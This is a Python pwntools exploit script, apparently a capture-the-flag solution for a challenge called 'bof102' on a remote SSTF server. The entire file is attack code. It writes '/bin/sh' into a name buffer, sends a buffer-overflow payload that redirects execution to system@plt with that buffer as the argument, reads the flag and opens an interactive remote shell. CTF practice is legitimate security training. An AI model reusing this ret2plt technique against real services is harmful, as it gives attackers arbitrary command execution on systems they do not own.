from pwn import *

e = ELF('./bof102')
r = remote('bof102.sstf.site', 1337)

SYSTEM_PLT = p32(e.plt['system'])
NAME_ADDR = p32(e.symbols['name'])

PAYLOAD = b'\x90' * 20 + SYSTEM_PLT + b'\x90' * 4 + NAME_ADDR

r.recvuntil(b'Name > ')
r.sendline(b'/bin/sh')
r.recvuntil(b'Do you wanna build a snowman?\n > ')
r.sendline(PAYLOAD)
r.sendline(b'cat flag')

r.interactive()